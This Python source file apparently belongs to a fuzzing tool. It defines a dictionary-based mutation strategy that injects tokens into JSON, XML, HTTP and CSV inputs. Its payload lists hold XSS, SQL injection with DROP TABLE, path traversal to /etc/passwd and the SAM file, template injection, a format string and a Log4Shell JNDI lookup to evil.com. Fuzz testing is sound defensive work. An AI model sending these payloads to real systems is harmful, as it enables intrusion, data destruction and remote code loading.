import random
from typing import List, Dict, Set, Optional

from .base import MutationStrategy


class DictionaryStrategy(MutationStrategy):
    """
    Dictionary-based mutation strategy that uses pre-defined dictionaries of tokens,
    keywords, and values to create meaningful mutations for specific formats.
    """

    def __init__(self, dictionary_path: Optional[str] = None):
        """
        Initialize the dictionary strategy.

        Args:
            dictionary_path: Path to custom dictionary file (optional)
        """
        super().__init__("Dictionary")
        self.dictionaries = self._initialize_dictionaries()
        if dictionary_path:
            self._load_custom_dictionary(dictionary_path)

    def _initialize_dictionaries(self) -> Dict[str, List[str]]:
        """Initialize built-in dictionaries for different formats."""
        return {
            'json': {
                'keys': [
                    'id', 'name', 'value', 'type', 'status', 'enabled', 'disabled',
                    'user', 'admin', 'password', 'token', 'session', 'auth',
                    'data', 'result', 'error', 'success', 'message', 'code',
                    'config', 'settings', 'options', 'parameters', 'metadata',
                    'created', 'updated', 'timestamp', 'version', 'format',
                    'length', 'size', 'count', 'total', 'offset', 'limit',
                    'sort', 'order', 'filter', 'search', 'query', 'fields',
                ],
                'values': [
                    'true', 'false', 'null', '0', '1', '-1', 'yes', 'no',
                    'active', 'inactive', 'pending', 'completed', 'failed',
                    'error', 'success', 'warning', 'info', 'debug',
                    'json', 'xml', 'csv', 'text', 'binary', 'base64',
                    'read', 'write', 'execute', 'delete', 'create', 'update',
                ],
                'strings': [
                    'test', 'demo', 'sample', 'example', 'default', 'admin',
                    'user', 'guest', 'root', 'system', 'config', 'temp',
                    'hello', 'world', 'foo', 'bar', 'baz', 'qux',
                ],
                'numbers': [
                    '0', '1', '2', '10', '100', '1000', '999999',
                    '-1', '-2', '-10', '-100', '2147483647', '-2147483648',
                    '3.14', '2.71', '0.0', '-0.0', '1e10', '1e-10',
                ]
            },
            'xml': {
                'tags': [
                    'root', 'item', 'element', 'data', 'value', 'name', 'id',
                    'type', 'content', 'body', 'header', 'footer', 'config',
                    'settings', 'property', 'attribute', 'field', 'param',
                    'request', 'response', 'message', 'error', 'result',
                ],
                'attributes': [
                    'id', 'name', 'type', 'value', 'class', 'style', 'lang',
                    'version', 'encoding', 'format', 'length', 'size',
                    'enabled', 'disabled', 'required', 'optional',
                    'readonly', 'visible', 'hidden', 'selected',
                ],
                'content': [
                    'text', 'value', 'data', 'content', 'message',
                    'hello', 'world', 'test', 'demo', 'sample',
                    'true', 'false', 'yes', 'no', 'ok', 'error',
                ]
            },
            'http': {
                'methods': ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'],
                'headers': [
                    'Host', 'User-Agent', 'Accept', 'Accept-Language', 'Accept-Encoding',
                    'Connection', 'Content-Type', 'Content-Length', 'Authorization',
                    'Cookie', 'Set-Cookie', 'Location', 'Referer', 'Origin',
                    'Cache-Control', 'Pragma', 'Expires', 'Last-Modified',
                    'If-Modified-Since', 'If-None-Match', 'ETag', 'Server',
                ],
                'content_types': [
                    'application/json', 'text/html', 'text/plain', 'application/xml',
                    'text/xml', 'application/x-www-form-urlencoded', 'multipart/form-data',
                    'application/octet-stream', 'image/jpeg', 'image/png', 'text/css',
                    'application/javascript', 'text/javascript',
                ],
                'status_codes': [
                    '200', '201', '202', '204', '301', '302', '304', '400',
                    '401', '403', '404', '405', '500', '502', '503',
                ]
            },
            'csv': {
                'headers': [
                    'id', 'name', 'email', 'phone', 'address', 'city', 'state',
                    'country', 'zip', 'created', 'updated', 'status', 'type',
                    'value', 'amount', 'price', 'quantity', 'total', 'tax',
                    'description', 'category', 'tags', 'active', 'enabled',
                ],
                'values': [
                    'test@example.com', 'user@domain.com', 'admin@site.com',
                    'John Doe', 'Jane Smith', 'Test User', 'Demo Account',
                    'New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix',
                    'Active', 'Inactive', 'Pending', 'Completed', 'Cancelled',
                    'True', 'False', 'Yes', 'No', '1', '0',
                ]
            },
            'common': {
                'commands': [
                    'ls', 'dir', 'cat', 'type', 'echo', 'print', 'help', 'exit',
                    'whoami', 'id', 'pwd', 'cd', 'mkdir', 'rmdir', 'rm', 'del',
                    'ps', 'top', 'kill', 'tasklist', 'netstat', 'ping', 'curl',
                ],
                'paths': [
                    '/', '/home', '/tmp', '/var', '/etc', '/usr', '/opt',
                    '/bin', '/sbin', '/lib', '/dev', '/proc', '/sys',
                    'C:\\', 'C:\\Windows', 'C:\\Program Files', 'C:\\Temp',
                    '../', '../../', '../../../', '..\\', '..\\..\\',
                ],
                'extensions': [
                    '.txt', '.log', '.conf', '.config', '.ini', '.cfg',
                    '.json', '.xml', '.csv', '.html', '.htm', '.php',
                    '.js', '.css', '.jpg', '.png', '.gif', '.pdf',
                    '.exe', '.dll', '.so', '.dylib', '.bin', '.dat',
                ],
                'protocols': [
                    'http://', 'https://', 'ftp://', 'file://', 'ssh://',
                    'mailto:', 'tel:', 'sms:', 'data:', 'about:',
                ]
            },
            'security': {
                'payloads': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    'javascript:alert("XSS")',
                    '<svg onload=alert("XSS")>',
                    "' OR '1'='1",
                    '" OR "1"="1',
                    "'; DROP TABLE users; --",
                    '../etc/passwd',
                    '..\\..\\..\\windows\\system32\\config\\sam',
                    '{{7*7}}',
                    '${jndi:ldap://evil.com/}',
                    '%s%s%s%s%n',
                    '../../proc/version',
                    '/dev/null',
                    'CON', 'PRN', 'AUX', 'NUL',
                ],
                'encodings': [
                    '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
                    '&#60;script&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;script&#62;',
                    '\\x3Cscript\\x3Ealert\\x28\\x22XSS\\x22\\x29\\x3C\\x2Fscript\\x3E',
                    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                    '..%2F..%2F..%2Fetc%2Fpasswd',
                ]
            }
        }

    def _load_custom_dictionary(self, dictionary_path: str) -> None:
        """Load custom dictionary from file."""
        try:
            # This is a placeholder for custom dictionary loading
            # In a real implementation, you would parse the file format
            pass
        except Exception as e:
            print(f"Warning: Could not load custom dictionary {dictionary_path}: {e}")

    def apply(self, data: bytes) -> bytes:
        """
        Apply dictionary-based mutations.

        Args:
            data: Original input data

        Returns:
            Data with dictionary mutations applied
        """
        if not data:
            return self._generate_from_dictionary()

        # Detect format and apply appropriate dictionary mutations
        mutation_type = random.choice([
            'replace_with_dictionary',
            'insert_dictionary_value',
            'append_dictionary_value',
            'keyword_substitution',
            'format_specific_mutation'
        ])

        if mutation_type == 'replace_with_dictionary':
            return self._replace_with_dictionary(data)
        elif mutation_type == 'insert_dictionary_value':
            return self._insert_dictionary_value(data)
        elif mutation_type == 'append_dictionary_value':
            return self._append_dictionary_value(data)
        elif mutation_type == 'keyword_substitution':
            return self._keyword_substitution(data)
        else:  # format_specific_mutation
            return self._format_specific_mutation(data)

    def _generate_from_dictionary(self) -> bytes:
        """Generate input entirely from dictionary entries."""
        format_type = random.choice(['json', 'xml', 'csv', 'http', 'common'])

        if format_type == 'json':
            return self._generate_json_from_dict()
        elif format_type == 'xml':
            return self._generate_xml_from_dict()
        elif format_type == 'csv':
            return self._generate_csv_from_dict()
        elif format_type == 'http':
            return self._generate_http_from_dict()
        else:  # common
            return self._generate_common_from_dict()

    def _replace_with_dictionary(self, data: bytes) -> bytes:
        """Replace parts of data with dictionary entries."""
        try:
            text_data = data.decode('utf-8', errors='ignore')
        except UnicodeDecodeError:
            return self._insert_dictionary_value(data)

        # Choose dictionary category based on content
        if '{' in text_data and '}' in text_data:
            category = random.choice(['json.keys', 'json.values', 'json.strings'])
        elif '<' in text_data and '>' in text_data:
            category = random.choice(['xml.tags', 'xml.attributes', 'xml.content'])
        elif ',' in text_data:
            category = random.choice(['csv.headers', 'csv.values'])
        else:
            category = random.choice(['common.commands', 'common.paths', 'security.payloads'])

        # Get dictionary entries
        dict_entries = self._get_dictionary_entries(category)
        if not dict_entries:
            return data

        # Replace a random word or section
        replacement = random.choice(dict_entries).encode('utf-8')

        # Find a suitable replacement position
        words = text_data.split()
        if words:
            word_to_replace = random.choice(words)
            word_bytes = word_to_replace.encode('utf-8')
            result = bytearray(data)
            pos = result.find(word_bytes)
            if pos != -1:
                result[pos:pos + len(word_bytes)] = replacement
                return bytes(result)

        # If no word found, just insert
        return self._insert_dictionary_value(data)

    def _insert_dictionary_value(self, data: bytes) -> bytes:
        """Insert a dictionary value into the data."""
        dict_value = self._get_random_dictionary_value().encode('utf-8')

        if not data:
            return dict_value

        insert_pos = random.randint(0, len(data))
        result = bytearray(data)
        result[insert_pos:insert_pos] = dict_value
        return bytes(result)

    def _append_dictionary_value(self, data: bytes) -> bytes:
        """Append a dictionary value to the data."""
        dict_value = self._get_random_dictionary_value().encode('utf-8')
        return data + dict_value

    def _keyword_substitution(self, data: bytes) -> bytes:
        """Substitute keywords with dictionary alternatives."""
        try:
            text_data = data.decode('utf-8', errors='ignore')
        except UnicodeDecodeError:
            return data

        # Common keyword mappings
        substitutions = {
            'true': ['false', 'null', '1', '0', 'yes', 'no'],
            'false': ['true', 'null', '0', '1', 'no', 'yes'],
            'null': ['true', 'false', 'undefined', 'empty', ''],
            'admin': ['root', 'administrator', 'superuser', 'guest', 'user'],
            'user': ['admin', 'root', 'guest', 'test', 'demo'],
            'password': ['passwd', 'pwd', 'secret', 'key', 'token'],
            'id': ['ID', 'identifier', 'uuid', 'guid', 'key'],
            'name': ['title', 'label', 'display', 'username', 'fullname'],
            'value': ['data', 'content', 'text', 'number', 'amount'],
            'type': ['kind', 'category', 'class', 'format', 'style'],
        }

        for original, alternatives in substitutions.items():
            if original in text_data.lower():
                replacement = random.choice(alternatives)
                # Case-insensitive replacement
                case_variants = [original, original.upper(), original.capitalize()]
                for variant in case_variants:
                    if variant in text_data:
                        text_data = text_data.replace(variant, replacement, 1)
                        break
                break  # Only substitute one keyword per mutation

        return text_data.encode('utf-8')

    def _format_specific_mutation(self, data: bytes) -> bytes:
        """Apply format-specific dictionary mutations."""
        try:
            text_data = data.decode('utf-8', errors='ignore')
        except UnicodeDecodeError:
            return self._insert_dictionary_value(data)

        if '{' in text_data and '}' in text_data:
            return self._mutate_json_with_dict(data)
        elif '<' in text_data and '>' in text_data:
            return self._mutate_xml_with_dict(data)
        elif text_data.strip().startswith(('GET', 'POST', 'PUT', 'DELETE')):
            return self._mutate_http_with_dict(data)
        else:
            return self._mutate_generic_with_dict(data)

    def _mutate_json_with_dict(self, data: bytes) -> bytes:
        """Mutate JSON using dictionary values."""
        dict_entries = self._get_dictionary_entries('json.keys')
        if not dict_entries:
            return data

        try:
            text_data = data.decode('utf-8', errors='ignore')
            # Add a new field with dictionary value
            new_key = random.choice(dict_entries)
            new_value = random.choice(self._get_dictionary_entries('json.values'))
            insertion = f',"{new_key}":"{new_value}"'

            # Insert before closing brace
            last_brace = text_data.rfind('}')
            if last_brace != -1:
                text_data = text_data[:last_brace] + insertion + text_data[last_brace:]
                return text_data.encode('utf-8')
        except:
            pass

        return data

    def _mutate_xml_with_dict(self, data: bytes) -> bytes:
        """Mutate XML using dictionary values."""
        dict_entries = self._get_dictionary_entries('xml.tags')
        if not dict_entries:
            return data

        try:
            text_data = data.decode('utf-8', errors='ignore')
            # Add a new element
            new_tag = random.choice(dict_entries)
            new_content = random.choice(self._get_dictionary_entries('xml.content'))
            new_element = f'<{new_tag}>{new_content}</{new_tag}>'

            # Insert before closing root tag
            last_close_tag = text_data.rfind('</')
            if last_close_tag != -1:
                text_data = text_data[:last_close_tag] + new_element + text_data[last_close_tag:]
                return text_data.encode('utf-8')
        except:
            pass

        return data

    def _mutate_http_with_dict(self, data: bytes) -> bytes:
        """Mutate HTTP using dictionary values."""
        try:
            text_data = data.decode('utf-8', errors='ignore')

            # Add a new header
            header_name = random.choice(self._get_dictionary_entries('http.headers'))
            header_value = random.choice(self._get_dictionary_entries('json.values'))
            new_header = f'\n{header_name}: {header_value}'

            # Insert before empty line before body
            header_body_split = text_data.find('\n\n')
            if header_body_split != -1:
                text_data = text_data[:header_body_split] + new_header + text_data[header_body_split:]
                return text_data.encode('utf-8')
        except:
            pass

        return data

    def _mutate_generic_with_dict(self, data: bytes) -> bytes:
        """Mutate generic text using dictionary values."""
        dict_value = self._get_random_dictionary_value()
        return (data + b' ' + dict_value.encode('utf-8'))

    def _get_dictionary_entries(self, category: str) -> List[str]:
        """Get entries from a specific dictionary category."""
        parts = category.split('.')
        current_dict = self.dictionaries

        for part in parts:
            if part in current_dict:
                current_dict = current_dict[part]
            else:
                return []

        if isinstance(current_dict, list):
            return current_dict
        else:
            return []

    def _get_random_dictionary_value(self) -> str:
        """Get a random value from any dictionary."""
        # Flatten all dictionary values
        all_values = []
        for category_dict in self.dictionaries.values():
            if isinstance(category_dict, dict):
                for values in category_dict.values():
                    if isinstance(values, list):
                        all_values.extend(values)
            elif isinstance(category_dict, list):
                all_values.extend(category_dict)

        return random.choice(all_values) if all_values else "test"

    def _generate_json_from_dict(self) -> bytes:
        """Generate JSON from dictionary entries."""
        keys = self._get_dictionary_entries('json.keys')
        values = self._get_dictionary_entries('json.values')

        if not keys:
            keys = ['key1', 'key2', 'key3']
        if not values:
            values = ['value1', 'value2', 'value3']

        max_fields = max(1, min(5, len(keys), len(values)))
        num_fields = random.randint(1, max_fields)
        fields = []

        for i in range(num_fields):
            key = random.choice(keys)
            value = random.choice(values)
            fields.append(f'"{key}": "{value}"')

        return f'{{{", ".join(fields)}}}'.encode('utf-8')

    def _generate_xml_from_dict(self) -> bytes:
        """Generate XML from dictionary entries."""
        tags = self._get_dictionary_entries('xml.tags')
        content = self._get_dictionary_entries('xml.content')

        if not tags:
            tags = ['item', 'element']
        if not content:
            content = ['value', 'text']

        root_tag = random.choice(tags)
        num_elements = random.randint(1, 3)

        xml = f'<{root_tag}>'
        for i in range(num_elements):
            tag = random.choice(tags)
            text = random.choice(content)
            xml += f'<{tag}>{text}</{tag}>'
        xml += f'</{root_tag}>'

        return xml.encode('utf-8')

    def _generate_csv_from_dict(self) -> bytes:
        """Generate CSV from dictionary entries."""
        headers = self._get_dictionary_entries('csv.headers')
        values = self._get_dictionary_entries('csv.values')

        if not headers:
            headers = ['id', 'name', 'value']
        if not values:
            values = ['1', 'test', 'data']

        num_cols = random.randint(2, min(4, len(headers), len(values)))
        selected_headers = headers[:num_cols]
        selected_values = values[:num_cols]

        header_row = ','.join(selected_headers)
        data_row = ','.join(selected_values)

        return f'{header_row}\n{data_row}'.encode('utf-8')

    def _generate_http_from_dict(self) -> bytes:
        """Generate HTTP request from dictionary entries."""
        methods = self._get_dictionary_entries('http.methods')
        headers = self._get_dictionary_entries('http.headers')
        content_types = self._get_dictionary_entries('http.content_types')

        method = random.choice(methods) if methods else 'GET'
        header_name = random.choice(headers) if headers else 'User-Agent'
        content_type = random.choice(content_types) if content_types else 'text/html'

        http_request = f'{method} / HTTP/1.1\nHost: example.com\n{header_name}: test\nContent-Type: {content_type}\n\n'
        return http_request.encode('utf-8')

    def _generate_common_from_dict(self) -> bytes:
        """Generate common text from dictionary entries."""
        categories = ['common.commands', 'common.paths', 'common.extensions', 'security.payloads']
        category = random.choice(categories)
        entries = self._get_dictionary_entries(category)

        if not entries:
            return b'test'

        # Combine multiple entries
        num_entries = random.randint(1, 3)
        selected = random.sample(entries, min(num_entries, len(entries)))
        return ' '.join(selected).encode('utf-8')

    def get_description(self) -> str:
        """Get a description of the dictionary strategy."""
        return "Uses pre-defined dictionaries to create meaningful mutations"

    def get_effectiveness_score(self) -> float:
        """Highly effective for format-specific parsing and injection vulnerabilities."""
        return 0.85

    def get_complexity_score(self) -> float:
        """Moderate complexity due to dictionary management."""
        return 0.4